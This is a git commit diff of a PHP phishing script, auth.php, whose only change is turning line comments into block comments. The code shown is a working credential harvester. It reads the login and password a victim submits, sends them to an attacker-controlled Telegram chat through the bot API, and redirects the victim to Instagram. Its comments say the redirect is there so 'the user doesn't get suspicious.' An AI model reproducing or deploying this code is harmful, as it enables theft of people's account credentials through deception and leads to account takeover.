a543233b259a0a376ae129112d94e1be53c03eac
What is love? <74537390+godwillforgive@users.noreply.github.com>
2022-04-22 14:29:18 +0300

    Update auth.php

--- auth.php
+++ auth.php
@@ -7,9 +7,9 @@ $password = $_POST['user_password'];
 $token = "";
 // The ID of the group chat you created in Telegram
 $chat_id = "";
-// The data obtained from the variables $name and $password will come to us in format:
-// login: admin
-// password: password
+/* The data obtained from the variables $name and $password will come to us in format:
+login: admin
+password: password */
 $arr = array(
   'Login: ' => $name,
   'Password: ' => $password
@@ -22,7 +22,9 @@ foreach($arr as $key => $value) {
 $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
 
 if ($sendToTelegram) {
-  // Redirect after the user logs in, so that the user doesn't get suspicious, use redirect to the social network/account that you linked to when you sent the message to them.
+  /* Redirect after the user logs in, 
+  so that the user doesn't get suspicious, 
+  use redirect to the social network/account that you linked to when you sent the message to them. */
   header('Location: https://instagram.com');
 } else {
   echo "Error";
